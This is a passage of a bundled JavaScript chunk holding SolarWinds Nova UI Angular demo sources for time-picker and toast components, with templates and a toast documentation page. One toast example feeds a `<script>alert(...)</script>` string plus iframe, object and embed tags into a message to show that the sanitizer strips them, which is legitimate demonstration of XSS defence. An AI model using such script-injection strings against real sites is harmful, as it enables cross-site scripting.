"time-picker-visual-test",\n    templateUrl: "./time-picker-visual-test.component.html",\n})\nexport class TimePickerVisualTestComponent implements OnInit {\n    public time: Moment;\n    public myTime: Moment;\n    public myForm: FormGroup<{\n        timePickerFormControl: FormControl<Moment | null>;\n    }>;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.myTime = moment("2018-12-14T12:00:00+02:00");\n    }\n\n    public ngOnInit(): void {\n        this.myForm = this.formBuilder.group({\n            timePickerFormControl: this.formBuilder.control(this.time, [\n                Validators.required,\n            ]),\n        });\n    }\n\n    public valueChange(time: any): void {\n        this.time = time;\n    }\n}\n'},80355:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDateTimePickerModule,\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiIconModule,\n    NuiTimeFrameBarModule,\n    NuiTimeFramePickerModule,\n    NuiTimePickerModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    TimePickerBasicExampleComponent,\n    TimePickerCustomFormatExampleComponent,\n    TimePickerCustomStepExampleComponent,\n    TimePickerDisabledExampleComponent,\n    TimePickerDocsExampleComponent,\n    TimePickerLocalizedExampleComponent,\n    TimePickerModelChangeExampleComponent,\n    TimePickerPreserveInsignificantExampleComponent,\n    TimePickerReactiveFormExampleComponent,\n    TimePickerVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: TimePickerDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "localized",\n        component: TimePickerLocalizedExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "time-picker-visual-test",\n        component: TimePickerVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiTimePickerModule,\n        FormsModule,\n        NuiFormFieldModule,\n        ReactiveFormsModule,\n        NuiDocsModule,\n        NuiIconModule,\n        NuiTimeFrameBarModule,\n        NuiDateTimePickerModule,\n        NuiTimeFramePickerModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        TimePickerBasicExampleComponent,\n        TimePickerCustomFormatExampleComponent,\n        TimePickerCustomStepExampleComponent,\n        TimePickerDisabledExampleComponent,\n        TimePickerDocsExampleComponent,\n        TimePickerLocalizedExampleComponent,\n        TimePickerModelChangeExampleComponent,\n        TimePickerPreserveInsignificantExampleComponent,\n        TimePickerReactiveFormExampleComponent,\n        TimePickerVisualTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("time-picker"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class TimePickerModule {}\n'},47750:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./toast-basic/toast-basic.example.component";\nexport * from "./toast-sticky-error/toast-sticky-error.example.component";\nexport * from "./toast-config/toast-config.example.component";\nexport * from "./toast-docs/toast-docs.example.component";\nexport * from "./toast-events/toast-events.example.component";\nexport * from "./toast-position/toast-position.example.component";\nexport * from "./toast-type/toast-type.example.component";\nexport * from "./toast-visual-test/toast-visual-test.component";\nexport * from "./toast-test/toast-test.component";\n'},98338:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    nui-button\n    type="button"\n    id="nui-basic-toast-html-example-1"\n    (click)="showToastWithEnabledHtml()"\n    i18n\n>\n    Show Toast With Enabled Html\n</button>\n<button\n    nui-button\n    type="button"\n    class="ml-3"\n    id="nui-basic-toast-html-example-2"\n    (click)="showToastWithDisabledHtml()"\n    i18n\n>\n    Show Toast With Disabled Html\n</button>\n<button\n    nui-button\n    type="button"\n    class="ml-3"\n    id="nui-basic-toast-html-example-3"\n    (click)="showToastWithScriptTagIncluded()"\n    i18n\n>\n    Show Toast With Script Tag\n</button>\n'},28798:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnInit } from "@angular/core";\n\nimport { IToastService, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toast-basic-html-example",\n    templateUrl: "./toast-basic-html.example.component.html",\n})\nexport class ToastBasicHtmlExampleComponent implements OnInit {\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public ngOnInit(): void {\n        this.toastService.setConfig(\n            { timeOut: 5000, extendedTimeOut: 2000 },\n            "id"\n        );\n    }\n\n    public showToastWithEnabledHtml(): void {\n        this.toastService.info({\n            title: $localize`Toast with enableHtml set to true`,\n            message: $localize`Hi there! I\'m a simple toast message. <a href="#">Awesome link</a>`,\n            options: {\n                enableHtml: true, // Note: Default value\n            },\n        });\n    }\n\n    public showToastWithDisabledHtml(): void {\n        this.toastService.info({\n            title: $localize`Toast with enableHtml set to false`,\n            message: $localize`Hi there! I\'m a simple toast message <a href="#">Awesome link</a>`,\n            options: {\n                enableHtml: false,\n            },\n        });\n    }\n\n    public showToastWithScriptTagIncluded(): void {\n        this.toastService.info({\n            title: $localize`Toast with forbidden tags and enableHtml set to true`,\n            message: $localize`\n                Hi there! I\'m a toast message with forbidden tags:\n                <script>alert("You shall not pass")<\/script>\n                <object width="400" height="400"></object>\n                <iframe src="https://www.solarwinds.com/"></iframe>\n                <embed src="https://www.solarwinds.com/">\n                `,\n            options: {\n                enableHtml: true, // Note: Default value\n            },\n        });\n    }\n}\n'},4348:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    nui-button\n    type="button"\n    id="nui-basic-toast-example"\n    (click)="onShowToast($event)"\n    i18n\n>\n    Show Toast\n</button>\n'},72108:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnInit } from "@angular/core";\n\nimport { IToastConfig, IToastService, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toast-basic-example",\n    templateUrl: "./toast-basic.example.component.html",\n})\nexport class ToastBasicExampleComponent implements OnInit {\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public ngOnInit(): void {\n        this.toastService.setConfig({}, "id");\n    }\n\n    public onShowToast(highlightMode: boolean): void {\n        this.toastService.info({\n            title: $localize`Simple Toast.`,\n            message: $localize`Hi there! I\'m a simple toast message`,\n            options: this.getOptions(),\n        });\n    }\n\n    private getOptions(): IToastConfig {\n        return {\n            timeOut: 5000,\n            extendedTimeOut: 2000,\n        };\n    }\n}\n'},75250:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    nui-button\n    type="button"\n    id="nui-toast-config-example"\n    (click)="onShowToast($event)"\n    i18n\n>\n    Show Toast\n</button>\n'},19278:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnInit } from "@angular/core";\n\nimport {\n    IToastConfig,\n    IToastService,\n    ToastPositionClass,\n    ToastService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toast-config-example",\n    templateUrl: "./toast-config.example.component.html",\n})\nexport class ToastConfigExampleComponent implements OnInit {\n    public selectedPosition: string;\n\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public ngOnInit(): void {\n        this.toastService.setConfig({}, "id");\n    }\n\n    public onShowToast(highlightMode: boolean): void {\n        this.toastService.info({\n            title: $localize`Toast Configuration`,\n            message: $localize`I\'m pretty easy to configure`,\n            options: this.getOptions(),\n        });\n    }\n\n    private getOptions(): IToastConfig {\n        return {\n            extendedTimeOut: 2000,\n            clickToDismiss: true,\n            closeButton: true,\n            positionClass: ToastPositionClass.BOTTOM_RIGHT,\n            progressBar: true,\n            progressAnimation: "increasing",\n            timeOut: 5000,\n        };\n    }\n}\n'},91243:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiToastModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<div>\n    You can use <code>IToastService</code>, <code>ToastService</code> to show a\n    (usually) temporary message (toast), associated with some event. In example\n    below we\'re showing a toast message when the "Show Toast" button is clicked.\n    Following construction is used to create a toast:\n    <code\n        >IToastService.info(toastDeclaration:\n        <a href="../interfaces/IToastDeclaration.html">IToastDeclaration</a\n        >)</code\n    >. Any property in\n    <a href="../interfaces/IToastDeclaration.html"\n        ><code>IToastDeclaration</code></a\n    >\n    is optional.\n</div>\n<p>\n    When using the toast component with a title, a space is automatically\n    inserted in front of the message body to create spacial separation from the\n    title. In addition to the provided space, it\'s suggested that the user add a\n    sentence-ending punctuation mark to the title to further emphasize this\n    separation.\n</p>\n<nui-example-wrapper filenamePrefix="toast-basic" exampleTitle="Basic usage">\n    <nui-toast-basic-example></nui-toast-basic-example>\n</nui-example-wrapper>\n\n<h2>Basic Usage With Html</h2>\n<p>\n    Toast allows HTML usage inside the\n    <code>{{ getToastDeclarationKey("message") }}</code> container by default.\n    Note: The provided value will be sanitized and rendered.\n</p>\n<p>\n    To configure a toast to display HTML as plain text, set the\n    <code>{{ getToastConfigKey("enableHtml") }}</code> property in\n    <code>{{ getToastDeclarationKey("options") }}</code> to <code>false</code>.\n</p>\n<p>\n    When the <code>{{ getToastConfigKey("enableHtml") }}</code> flag is turned\n    on, all the content will be sanitized, basic tags for changing fonts are\n    often allowed, such as <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>,\n    <code>&lt;u&gt;</code>, <code>&lt;em&gt;</code>, and\n    <code>&lt;strong&gt;</code>. More advanced tags such as\n    <code>&lt;script&gt;</code>, <code>&lt;object&gt;</code>,\n    <code>&lt;embed&gt;</code>, and <code>&lt;link&gt;</code> are removed by the\n    sanitization process. Additionally, potentially dangerous attributes such as\n    <code>onclick</code> are removed in order to prevent malicious code from\n    being injected.\n</p>\n<nui-example-wrapper\n    filenamePrefix="toast-basic-html"\n    exampleTitle="Basic HTML Usage"\n>\n    <nui-toast-basic-html-example></nui-toast-basic-html-example>\n</nui-example-wrapper>\n\n<h2>Types</h2>\n<p>\n    Toast types allows you to convey some contextual information about the\n    message by applying different styles to toasts.\n</p>\n<nui-example-wrapper filenamePrefix="toast-type" exampleTitle="Types">\n    <nui-toast-type-example></nui-toast-type-example>\n</nui-example-wrapper>\n\n<h2>Configuration</h2>\n<p>\n    Toast messages are highly configurable via\n    <a href="../interfaces/IToastConfig.html">IToastConfig</a> interface. The\n    following example employs some of the more common settings:\n    <br />\n    <code>\n        extendedTimeOut: 2000, clickToDismiss: true, closeButton: true,\n        positionClass: "toast-bottom-right", progressBar: true,\n        progressAnimation: "increasing", timeOut: 5000\n    </code>\n</p>\n<nui-example-wrapper filenamePrefix="toast-config" exampleTitle="Configuration">\n    <nui-toast-config-example></nui-toast-config-example>\n</nui-example-wrapper>\n\n<h2>Positioning</h2>\n<p>\n    The position of a toast message is determined by the value of\n    <code>IToastConfig.positionClass</code>. By default toast is positioned\n    top-right. To implement different positioning you must pass one of available\n    options from\n    <a href="../miscellaneous/enumerations.html#ToastPositionClass"\n        ><code>ToastPositionClass</code></a\n    >\n    to\n    <a href="../interfaces/IToastConfig.html"><code>IToastConfig</code></a>\n    positionClass property.<br /><br />\n\n    It is also possible to set a custom class to configure the position of the\n    <code>nui-toast</code>. Simply populate the\n    <code>IToastConfig.positionClass</code> with the custom css class name.\n\n    <nui-message type="warning" [allowDismiss]="false">\n        Make sure you defined a custom class in a global stylesheet\n    </nui-message>\n</p>\n<nui-example-wrapper filenamePrefix="toast-position" exampleTitle="Positioning">\n    <nui-toast-position-example></nui-toast-position-example>\n</nui-example-wrapper>\n\n<h2>Sticky Error</h2>\n<p>\n    You can also optionally force error toasts to remain visible indefinitely\n    using <code>IToastConfig.stickyError</code>. Note, that this option is only\n    available with <code>IToastService.error</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="toast-sticky-error"\n    exampleTitle="Sticky error"\n>\n    <nui-toast-sticky-error-example></nui-toast-sticky-error-example>\n</nui-example-wrapper>\n\n<h2>Events</h2>\n<p>\n    With <a href="../interfaces/IActiveToast.html">IActiveToast</a>, it\'s\n    possible to capture (and act upon) following events per toast instance:\n</p>\n<ul>\n    <li><code>onShown</code></li>\n    <li><code>onHidden</code></li>\n    <li><code>onClick</code></li>\n</ul>\n<nui-example-wrapper filenamePrefix="toast-events" exampleTitle="Events">\n    <nui-toast-events-example></nui-toast-events-example>\n</nui-example-wrapper>\n'},41544:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IToastConfig, IToastDeclaration } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toast-docs-example",\n    templateUrl: "./toast-docs.example.component.html",\n})\nexport class ToastExampleComponent {\n    getToastDeclarationKey(key: keyof IToastDeclaration): string {\n        return key;\n    }\n    getToastConfigKey(key: keyof IToastConfig): string {\n        return key;\n    }\n}\n'},95792:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div *ngIf="isDisplayed; else notoast">\n    <nui-message type="info" [allowDismiss]="false">\n        <div i18n>ID of last toast shown: {{ lastShown }}</div>\n    </nui-message>\n    <nui-message type="info" [allowDismiss]="false">\n        <div id="toast-example-click-counter" i18n>\n            Clicks on toast: {{ clickCount }}\n        </div>\n    </nui-message>\n</div>\n<ng-template #notoast\n    ><nui-message type="info" [allowDismiss]="false" i18n\n        >No toast displayed</nui-message\n    ></ng-template\n>\n<nui-divider></nui-divider>\n<button\n    nui-button\n    type="button"\n    id="nui-toast-events-example"\n    (click)="onShowToast($event)"\n    i18n\n>\n    Show Toast\n</button>\n'},1104:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnInit } from "@angular/core";\n\nimport {\n    IActiveToast,\n    IToastConfig,\n    IToastService,\n    ToastPositionClass,\n    ToastService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toast-events-example",\n    templateUrl: "./toast-events.example.component.html",\n})\nexport class ToastEventsExampleComponent implements OnInit {\n    public lastShown?: number;\n    public clickCount = 0;\n    public toastCount = 0;\n    public isDisplayed: boolean;\n\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public ngOnInit(): void {\n        this.toastService.setConfig({}, "id");\n    }\n\n    public onShowToast(highlightMode: boolean): void {\n        const toastInstance: IActiveToast = this.toastService.info({\n            title: $localize`Toast Events`,\n            message: $localize`Click Me!`,\n            options: this.getOptions(),\n        });\n        toastInstance.onShown?.subscribe(() => {\n            ++this.toastCount;\n            this.isDisplayed = true;\n            this.lastShown = toastInstance.toastId;\n        });\n\n        toastInstance.onClick?.subscribe(() => {\n            ++this.clickCount;\n        });\n\n        toastInstance.onHidden?.subscribe(() => {\n            --this.toastCount;\n            this.isDisplayed = this.toastCount > 0;\n        });\n    }\n\n    private getOptions(): IToastConfig {\n        return {\n            extendedTimeOut: 5000,\n            clickToDismiss: false,\n            closeButton: false,\n            positionClass: ToastPositionClass.TOP_RIGHT,\n            progressBar: true,\n            progressAnimation: "increasing",\n            timeOut: 10000,\n        };\n    }\n}\n'},18896:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-flex-container">\n    <div>\n        <nui-radio-group [(value)]="selectedPosition">\n            <nui-radio\n                *ngFor="let position of toastPositions"\n                id="{{ \'nui-toast-position-\' + position.className }}"\n                [checked]="position.className === \'nui-toast--top-right\'"\n                [value]="position.className"\n            >\n                {{ position.displayValue }}\n            </nui-radio>\n        </nui-radio-group>\n    </div>\n</div>\n<button\n    nui-button\n    type="button"\n    id="nui-toast-position-example"\n    (click)="onShowToast($event)"\n    i18n\n>\n    Show Toast\n</button>\n'},73424:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnInit } from "@angular/core";\n\nimport {\n    IToastConfig,\n    IToastService,\n    ToastPositionClass,\n    ToastService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toast-position-example",\n    templateUrl: "./toast-position.example.component.html",\n})\nexport class ToastPositionExampleComponent implements OnInit {\n    public toastPositions = [\n        {\n            displayValue: $localize`Top Right`,\n            className: ToastPositionClass.TOP_RIGHT,\n        },\n        {\n            displayValue: $localize`Top Left`,\n            className: ToastPositionClass.TOP_LEFT,\n        },\n        {\n            displayValue: $localize`Bottom Right`,\n            className: ToastPositionClass.BOTTOM_RIGHT,\n        },\n        {\n            displayValue: $localize`Bottom Left`,\n            className: ToastPositionClass.BOTTOM_LEFT,\n        },\n        {\n            displayValue: $localize`Top Full Width`,\n            className: ToastPositionClass.TOP_FULL_WIDTH,\n        },\n        {\n            displayValue: $localize`Bottom Full Width`,\n            className: ToastPositionClass.BOTTOM_FULL_WIDTH,\n        },\n        {\n            displayValue: $localize`Top Center`,\n            className: ToastPositionClass.TOP_CENTER,\n        },\n        {\n            displayValue: $localize`Bottom Center`,\n            className: ToastPositionClass.BOTTOM_CENTER,\n        },\n        {\n            displayValue: $localize`CUSTOM CLASS (top: 200px; right: 200px)`,\n            className: "demoToastCustomClass",\n        },\n    ];\n    public selectedPosition: ToastPositionClass | string =\n        this.toastPositions[0].className;\n\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public ngOnInit(): void {\n        this.toastService.setConfig({}, "id");\n    }\n\n    public onShowToast(highlightMode: boolean): void {\n        this.toastService.info({\n            title: $localize`Position Example`,\n            message: this.selectedPosition,\n            options: this.getOptions(),\n        });\n    }\n\n    private getOptions(): IToastConfig {\n        return {\n            timeOut: 5000,\n            extendedTimeOut: 2000,\n            positionClass: this.selectedPosition,\n        };\n    }\n}\n'},44470:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    nui-button\n    type="button"\n    id="nui-show-sticky-error-toast-example"\n    (click)="onShowStickyError($event)"\n    i18n\n>\n    Show Sticky Error\n</button>\n<button\n    nui-button\n    type="button"\n    id="nui-hide-sticky-error-toast-example"\n    (click)="onHideStickyError($event)"\n    i18n\n>\n    Hide Sticky Error\n</button>\n'},61410:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnInit } from "@angular/core";\n\nimport {\n    IToastConfig,\n    IToastService,\n    ToastPositionClass,\n    ToastService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toast-sticky-error-example",\n    templateUrl: "./toast-sticky-error.example.component.html",\n})\nexport class ToastStickyErrorExampleComponent implements OnInit {\n    public selectedPosition: string;\n\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public ngOnInit(): void {\n        this.toastService.setConfig({}, "id");\n    }\n\n    public onShowStickyError(highlightMode: boolean): void {\n        this.toastService.error({\n            title: $localize`Sticky Error`,\n            message: $localize`Red Alert`,\n            options: this.getOptions(),\n        });\n    }\n\n    public onHideStickyError(highlightMode: boolean): void {\n        this.toastService.clear();\n    }\n\n    private getOptions(): IToastConfig {\n        return {\n            clickToDismiss: false,\n            closeButton: false,\n            positionClass: ToastPositionClass.TOP_RIGHT,\n            stickyError: true,\n        };\n    }\n}\n'},71818:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div id="nui-toast-test" class="container">\n    <div class="py-2">\n        